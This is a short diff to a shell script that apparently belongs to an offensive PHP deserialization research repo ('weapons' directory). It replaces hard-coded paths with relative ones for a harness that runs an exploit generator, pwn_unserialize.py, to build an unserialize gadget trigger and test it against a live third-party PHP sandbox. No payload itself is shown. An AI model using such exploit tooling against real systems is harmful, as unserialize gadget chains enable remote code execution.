@@ -2,8 +2,11 @@
 # Matrix item: pwn_unserialize.py --gen-trigger output -> 3v4l.org (live,
 # third-party vanilla PHP 8.5.11) with the gadget class defined in-code.
 set -u
-OUT=/mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/receipts/live_3v4l_gentrigger.log
-GEN=$(python3 /mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/pwn_unserialize.py --gen-trigger --gadget-class AppCacheFlusher 2>/dev/null | head -1)
+LAB=$(cd "$(dirname "$0")" && pwd)
+WEAPONS=$(cd "$LAB/.." && pwd)
+REPO=$(cd "$LAB/../.." && pwd)
+OUT=$WEAPONS/receipts/live_3v4l_gentrigger.log
+GEN=$(python3 $WEAPONS/pwn_unserialize.py --gen-trigger --gadget-class AppCacheFlusher 2>/dev/null | head -1)
 B64=$(printf '%s' "$GEN" | base64 -w0)
 echo "generated trigger: ${#GEN} bytes (base64 ${#B64})" | tee "$OUT"
 
